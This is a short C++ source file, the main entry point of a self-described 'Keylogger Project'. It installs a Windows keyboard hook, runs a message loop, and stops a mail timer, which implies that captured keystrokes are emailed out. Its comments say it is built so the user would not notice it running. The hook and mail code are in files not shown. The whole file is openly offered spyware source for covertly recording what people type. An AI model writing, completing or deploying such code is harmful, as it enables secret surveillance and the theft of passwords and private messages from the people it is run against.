/*
Mir Hossain
June 24, 2018
Keylogger Project
*/

#include <iostream>
#include <windows.h>

#include "KeybHook.h"

using namespace std;

int main()
{
    MSG Msg;
    IO::MkDir(IO::GetOurPath(true));
    InstallHook();


    /*
    Masks the keylogger to where the user wouldn't notice the program.
    Only way to see program running is by opening task manager.
    All of these functions are derived from the windows library.
    */
    while(GetMessage (&Msg, NULL, 0, 0)) //This hides any message in the terminal
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
